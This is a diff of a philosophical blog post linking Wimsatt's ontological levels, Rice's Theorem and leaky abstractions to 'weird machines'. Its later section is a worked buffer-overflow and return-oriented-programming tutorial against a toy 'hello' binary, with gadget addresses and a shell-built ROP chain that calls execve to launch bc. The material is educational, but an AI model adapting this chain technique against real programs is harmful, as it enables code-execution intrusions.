@@ -1,5 +1,4 @@
 
-![img](/img/AI_ooze_transparent.png)
 
 ## The Story So Far...
 
@@ -24,10 +23,9 @@ times in science and engineering," in general, Adam notes,
 > these conditions of highly localized rules "ontological slime", and the
 > complex feedback mechanisms that accompany them "causal thickets".
 
-
 ## The Slime Is Seeping from Inside the House
 
-While the emphasis in Adam's first post are the little decisions by which
+While the emphasis in Adam's first post is on the little decisions by which
 software engineers collapse ambiguity by fiat -- abjuring the ambiguity
 of [sorites problems](https://plato.stanford.edu/entries/sorites-paradox),
 for example, by mapping heaps and herds and so on to unambiguous formal 
@@ -58,21 +56,22 @@ that this "sliminess", or recalcitrance to generality, isn't just a
 consequence of software's congress with its other -- as if, in its own
 Platonic abode, computation would be able to grasp itself clearly and dryly.
 
-[ -- transition needed -- ]
-
 ### The Limits of Static Analysis
 
-This observation actually runs up against the Halting Problem, and the art of
-[static program analysis](https://youtube.com/watch?v=POvX4hYIoxg), 
-in interesting ways. For any non-trivial property,
+Computation _itself_ is recalcitrant to generalization, in some very 
+precise ways. 
+For any non-trivial property,
 it is strictly _impossible_ to concoct a "universal rule" that would let you
 partition the universe of programs into those which have that property, and those
 which do not. This is the upshot of 
 [Rice's Theorem](https://en.wikipedia.org/wiki/Rice%27s_theorem),
 an corollary of Turing's Halting Theorem. This doesn't mean that we can't 
-concoct rules -- or algorithms -- that still do a _pretty good job_ of 
+concoct rules (algorithms) that still do a _pretty good job_ of 
 deciding, for a given program P, whether or not P exhibits some interesting
-property. But "pretty good", here, cannot mean certain or universally applicable.
+property. But "pretty good", here, cannot mean certain or universally applicable,
+and it is this gaping impasse that the science of
+[static program analysis](https://youtube.com/watch?v=POvX4hYIoxg)
+must forever circumnavigate
 There exist a great many methods of static analysis, but every single one of
 them represents a certain compromise with this impossibility at the heart of
 computation: they may be
@@ -82,10 +81,15 @@ computation: they may be
 3. occasionally, and unpredictably, non-terminating.
 
 In effect, even our rules for analysing that most general of things in computer
-science -- the _program_ -- are insuperably partial, or "slimy". It's not just
+science -- the _program_ -- are insuperably partial. 
+It is in this sense that, in the domain of computation, 
+"[the One is not](http://incainstitute.org/pdf/alain-badiou-being-and-event.pdf)".
+(And, just as in set theory, the reason for this has to do, at bottom, with
+the logical structure of diagonalization.)
+It's not just
 when it's forced to deal with "the real world" that computer science gets
 tangled in the thicket of uncertainty. Like someone -- was it Hegel? -- once
-said about the concept: _computation wants nothing more than to grasp itself, but
+said about the Concept: _computation wants nothing more than to grasp itself, but
 it ever stands in its own way_. 
 
 ### Compilers and Ontology
@@ -123,12 +127,6 @@ code programmer, don't have to. It facilitates and remediates a threshold of
 competence, and _creates_ a hierarchy of "ontological levels", 
 in Wimsatt's sense.
 
-# TODO
-
-- Elaborate Wimsatt's sense of "ontological levels",
-
-- It may sound strange to speak of "abstractions" and "ontological levels" more
-or less interchangeably. Explain this.
 
 ## Yeggogology
 
@@ -169,8 +167,32 @@ from the domain of software engineering:
 > "Synthetic Programming" and also a later (1982) book of that same title by its
 > main developer, William Wickes.
 
+### Leaky Abstractions
+
+The metaphor of "leakage" will ring familiar to the ears of many of
+programmer. Programming folklore even has a name for the oft-repeated
+observation that
+**All non-trivial abstractions, to some degree, are leaky**:
+[Spolsky's Law](https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/).
+
+It's more of a rule of thumb, really, than a law of computation (in the
+sense that, say, Rice's Theorem gives us a "law of computation"). But
+exceptions are few and far between, and, for any particular case, it's
+good practice to assume the truth of Spolsky's Law unless the contrary
+can be proven. 
+
+"Abstractions", in Spolsky's sense, are very close to what Wimsatt calls
+"ontological levels": these are not simply discursive or ideal entities, but
+real systems of entities and interactions, each of which is best (or, at least,
+most expediently) understood with reference to other entities and interactions
+lying on the same plane of abstraction, the same "ontological level" --
+until the level springs a leak, and the task understanding falls to the hacker.
+
+### Into the Warren
+
+Let's stay with Wimsatt's example of ontological leakage a little longer.
 Wikipedia's entry on [Synthetic Programming (HP-41)](https://en.wikipedia.org/wiki/Synthetic_Programming_(HP-41)) elaborates a little on the
-technique:
+technique that Wimsatt describes:
 
 > Synthetic programming uses a bug in the calculator firmware to enter those byte
 > sequences as a sequence of other instructions, then partially skipping halfway
@@ -268,26 +290,61 @@ The term seems to have been first introduced by
 [Sergey Bratus](https://www.cs.dartmouth.edu/~sergey/hc/rss-hacker-research.pdf),
 but has received its most systematic definition through the work of 
 [Halvar Flake](https://ieeexplore.ieee.org/ielx7/6245516/6558478/08226852.pdf)
-(aka Thomas Dullien).
+(aka Thomas Dullien). The basic idea is as follows:
+
+To begin with, we can view any software system as a finite automaton, or
+"[state machine](https://en.wikipedia.org/wiki/Finite-state_machine)",
+of some form, which transitions from state to state in
+response to user input. In a certain, very real sense, the input that the
+user provides is the "code" for that state machine. When you push the
+buttons on your SNES controller, for example, you are submitting a
+sequence of instructions to the Super Mario World machine, and which state
+it enters at each moment is entirely dependent on which state it was in,
+and which "instruction" you gave it. 
+
+But the state machine that describes Mario's world is not, itself, identical
+to the vastly more complex state machine that is the Super Nintendo's 
+[65c816](https://en.wikibooks.org/wiki/Super_NES_Programming/65c816_reference)
+instruction set architecture, in which the former is implemented, and on which
+it supervenes. 
+
+Like the intended finite state machines that describe any piece of software,
+a weird machine, too, is a _virtual_ machine, a real abstraction supervening
+on an underlying computational system. But unlike the state machine that
+describes, say, Super Mario World, or the 65c816 ISA of the SNES, weird 
+machines are not designed. Their creation is not deliberate, but spontaneous. 
+They are not so much invented as discovered. 
+
+Their creation, and discovery, takes place by first forcing a
+state machine -- a software application -- into a state that falls outside
+of its intended design. This is what we call a "weird state". In the case
+of the programmable calculators discussed above, this may be achieved
+by "applying normal arithmetic operations to error messages, jumping to 
+non-existent addresses" or some other "clever step away from the documented
+path". 
+
+If this "weird state" does not immediately crash the system, then it
+may be possible to continue to apply the transitions of the state
+machine, and shift the system from one weird state into another. From
+there, a new computational system unfolds, a chimera that plunges us
+beneath the ontological level that makes up the game world, for example,
+or the state machine that interfaces with the user, and takes us into
+a strange and undesigned environment, an artificial wilderness. 
+
+The task of the hacker -- the yeggologist -- is to discover, initialize,
+and then program weird machines. What we call "exploits" are nothing
+more, and nothing less, than programs for weird machines. When you can
+pull it off, 
+[it looks like nothing so much as sorcery](https://www.youtube.com/watch?v=hB6eY73sLV0).
+
+Like the compiler, the yeggologist traverses between at least two distinct
+"ontological levels", but does so obliquely -- breaking the surface
+of the application layer by way of a fault, an error, or a _weird state_,
+and diving into an ill-defined, and often entirely uncharted region
+that has formed, spontaneously, _between_ computational/ontological levels. 
 
 
-### Leaky Abstractions (recap)
-
-The exploration and programming of weird machines is possible, generally
-speaking, because abstractions -- or "ontological levels", in Wimsatt's sense
--- leak. Software engineers, in fact, are fond of citing
-[Spolsky's Law](https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/)
-on this subject: 
-
-**All non-trivial abstractions, to some degree, are leaky.**
-
-It's more of a rule of thumb, really, than a law of computation (in the
-sense that, say, Rice's Theorem gives us a "law of computation"). But
-exceptions are few and far between, and, for any particular case, it's
-good practice to assume the truth of Spolsky's Law unless the contrary
-can be proven. 
-
-## Smashing Function Ontology for Fun and Profit
+## Smashing Ontologies for Fun and Profit
 
 Let's take the idea of a "function" or "subroutine" in an imperative language,
 like C, for an example. What's the "theory of the function" that the programmer's
@@ -309,6 +366,7 @@ to inform the user that they have, indeed, been greeted.
 #include <stdio.h>
 #include <string.h>
 
+/* pay no attention to this function, for now */
 void weird(void) {
   printf("ph'nglui mglw'nafh Cthulhu R'lyeh wgah'nagl fhtagn\n");
   return;
@@ -528,27 +586,216 @@ ph'nglui mglw'nafh Cthulhu R'lyeh wgah'nagl fhtagn
 Segmentation fault (core dumped)
 ```
 
-We can, in fact, put any sequence of addresses that we like. 
+We can, in fact, put any sequence of addresses that we like. We can call 
+other functions, and even pass arguments to them -- all we have to
+do is place them on the stack, which we already control. By finding
+the address of the string "Cthulu R'lyeh wgah'nagl fhtagn!", for
+example, and the address of the hello() function, we can cause our
+program to call hello twice, and on the second pass greet Cthulhu
+himself.
+
+```
+$ ./hello 1234567890123456789012$'\x30\x9b\x04\x08'aaaa$'\x1b\xe0\x0a\x08'
+This program is going to greet you.
+Hello, 12345678901234567890120aaaa
+!
+Hello, Cthulhu R'lyeh wgah'nagl fhtagn!
+Segmentation fault (core dumped)
+```
+
+There's no reason, in fact, to limit ourselves to _function_ addresses,
+either. So long as we wish to maintain control of the flow of execution,
+we can use _any_ address that will eventually direct the CPU to fetch
+another address from the stack, which we control. Functions, by 
+definition, always end with a **RET** instruction, which instructs
+the CPU to pop an address off the stack and jump to it immediately, serves this
+purpose admirably, but they're only a special case. 
+
+The more general concept is what we call a "gadget", which here means any
+sequence of instructions whose execution ends with a **RET**. Our **hello**
+binary has over 7000 of these sequences. Together, they 
+can be thought of as a new, emergent instruction set for a spontaneous
+virtual machine -- a "weird machine", which we program using a technique
+called "Return-Oriented Programming", or ROP.
+
+Suppose we want to build a program for the weird return-oriented machine
+that subsists in the **hello** binary, one which, when executed, launches
+the [basic calculator application, bc](https://en.wikipedia.org/wiki/Bc_%28programming_language%29), 
+from the same working directory. To do this, we're going to need to prepare
+and execute the **execve()** system call, which tells the Linux kernel to
+launch a new program. **execve()** expects to find its arguments -- the 
+path of the program being launched, the command line parameters for that
+program, and its environment variables -- in the EBX, ECX and EDX machine
+registers, respectively. We'll also need to set the EAX register to the
+system call number for execve(), which happens to be 11. Once everything
+is in position, we can then jump to an *interrupt 0x80* instruction, to
+enact the call. 
+
+And of course, we can't do this the easy way, using individual x86 assembly
+instructions. We have to descend into the thicket of mutually interfering
+gadgets -- the instruction set of a wild, virtual machine -- that happen
+to subsist in **hello**, and find what we need there. 
+
+First, let's zero out the EDX register, so that we don't need to build
+an environment variable array. Here's a gadget that'll do the trick, 
+in addition to zeroing out EAX, which will make it easier to then
+set to the proper system call number. It'll also populate a few registers
+from the stack, but we don't need to worry about those yet.
+
+```
+0x0805cf23 : 
+  xor edx, edx
+  pop ebx
+  mov eax, edx
+  pop esi
+  pop edi
+  pop ebp
+  ret
+```
+
+Now we need to pad the stack with the data that will be popped into EBX,
+ESI, EDI, and EBP. We don't really care what finds its way into those
+registers at this point, so we'll just use sixteen bytes of meaningless
+padding. The string
+
+```
+This is padding.
+```
+
+will do. Next, we need to increment EAX up to 11. This can be done with
+eleven applications of the mercifully simple gadget
+
+```
+0x0807c0f9 : 
+  nop
+  inc eax
+  ret
+```
+
+Next, we need to load the ECX register with a pointer to a NULL pointer
+(since we're going to be lazy, and omit any command line parameters, 
+including the name of the program), and load the EBX register with a pointer
+to the string "bc". A full path would be preferable, but it would take more
+time to craft a chain that constructed the string "/usr/bin/bc", and it's
+easier to just copy the **bc** binary to the current directory, first.
+And as luck would have it, the string "bc" is _already_ mapped to the
+.rodata section of memory by the binary, like the letters of a ransom note,
+at the end of the string "libc", which sits at address 0x080be4dc.
+Incrementing that address by 2 gives us a pointer to the null-terminated
+string "bc\x00", which is just what we need. 
+
+```
+0x0806ecd2 : 
+  pop ecx
+  pop ebx
+  ret
+  
+0x0804bad4 : pointer to NULL
+
+0x080be4dc : pointer to "bc\x00"
+```
+
+Finally, we need a pointer to an "int 0x80" instruction, to actually perform
+the syscall:
+
+```
+0x0806f60f :
+  nop
+  int 0x80
+```
 
 
+Now we just need to put it all together. 
+
+```sh
+P=1234567890123456789012  # padding
+P=${P}$'\x23\xcf\x05\x08' # zero edx and eax
+P=${P}'This is padding.'  # that was padding
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xf9\xc0\x07\x08' # increment eax
+P=${P}$'\xd2\xec\x06\x08' # load parameters
+P=${P}$'\xd4\xba\x04\x08' # pointer to NULL
+P=${P}$'\xde\xe4\x0b\x08' # pointer to "bc"
+P=${P}$'\x0f\xf6\x06\x08' # system call
+
+./hello "$P"
+```
+
+And just like that, we're in the calculator:
+
+```
+This program is going to greet you.
+Hello, 1234567890123456789012#This is padding.��������������
+                                                           !
+bc 1.07.1
+Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006,
+2008, 2012-2017
+Free Software Foundation, Inc.
+This is free software with ABSOLUTELY NO WARRANTY.
+For details type `warranty'. 
+5 + 7
+12
+```
 
 
+## Invisigoth was Right
 
-### Urschleim in Silicon
 
-Interestingly, what nudged Adam's analysis into this reflective posture -- one
-bearing on the ways in which not just the world, but code itself, is slime for
-code -- was Dom's reply, 
-[Digital Goop](https://thelastinstance.com/posts/digital_goop/), which
-concludes with this intriguing analogy:
+Dominic Fox's contribution to this thread, in the post
+[Digital Goop](https://thelastinstance.com/posts/digital_goop/), 
+concludes with an intriguing analogy on the subject of ontological slime
+and its interaction with computing:
 
 > The way forward may be to see slime itself as already code-bearing, rather as
 > one imagines fragments of RNA floating and combining in a primordial soup.
 > Suppose we think of programming as refining slime, making code out of its codes,
 > sifting and synthesizing.
 
+A particularly fascinating suggestion here is thinking of the irregular
+"slime" that subsists between the charted ontological levels of software,
+rich in "hidden structures", may coalesce _spontaneously_ into programmatic
+forms... In the case of the primordial soup, all that was needed
+to coax complexity and coherence out of the ooze was _selection_. Could
+the same be said of all this "artificial slime"?
 
-This got me thinking about the (rather pulpy) imagery that I used when I
-introduced [ROPER](http://roper.eschtronics.ca), imagery that made it into the
-title of my thesis: *Urschleim in Silicon: Return Oriented Program Evolution
-with ROPER*.
+![img](/img/AI_ooze_transparent.png)
+
+If you're already familiar with my current research obsessions, then you would
+expect my answer to this question to be an unhesitating "yes". And you would be
+correct. As I've mentioned on this blog [already](/posts/hello.md#roper), my 
+grad research in computer science was more or less centred on this question,
+and involved some extensive experimentation in the literal evolution of
+ROP chains out of an amorphous "primoridal ooze" of gadgetry. The documentation
+and code for that project -- _Urschleim in Silicon: Return Oriented Program
+Evolution with ROPER_ -- can be found [here](http://roper.eschatronics.ca).
+
+The light shed by William Wimsatt's ontological framework, however, is
+altogether new to me. It was only _while_ writing up this (rather sprawling
+and meandering) blog post that, at Conflated Automatons' prompting, I
+read his magnificent essay,
+["The Ontology of Complex Systems: Levels of Organization, Perspectives, and Causal Thickets"](https://pdfs.semanticscholar.org/593c/cfacbef43e2bca905b78df234ff32a1ced58.pdf).
+I've only scratched the surface of that text here, and owe it to myself
+to return to it in a future post. 
+
+One of the most intriguing suggestions that Wimsatt makes -- and one that might
+even be testable in the context of evolutionary computation -- is that 
+the coherence of ontological levels is _itself_ an effect of broadly Darwinian
+selection. The tendency of reality to coalesce into "ontological levels",
+he claims, 
+>is analogous to a kind of 'fitness maximization' claim for ontology.
+
+This couples nicely with the strong, but never quite justified, hunch that
+guided me through my Master's research: that evolutionary search processes
+are _particularly_ well suited to feeling out "weird machine",
+hidden deep in computational thickets, with their pregnant causes mixed,
+and sculpting code from those dark materials.
+
